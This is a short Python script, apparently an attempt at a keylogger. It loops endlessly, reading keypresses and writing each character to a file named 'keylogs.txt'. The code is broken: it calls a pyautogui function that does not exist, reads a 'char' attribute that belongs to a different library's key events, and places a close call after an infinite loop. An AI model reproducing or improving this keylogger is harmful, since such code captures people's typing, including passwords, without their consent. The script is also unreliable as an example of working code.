import pyautogui

file = open('keylogs.txt', 'w')

while True:
    key = pyautogui.keyPress()

    if key.char:
        file.write(key.char)
    elif str(key) not in ['spacebar', 'enter']:
        file.write(str(key))

    print(key.char)

file.close()
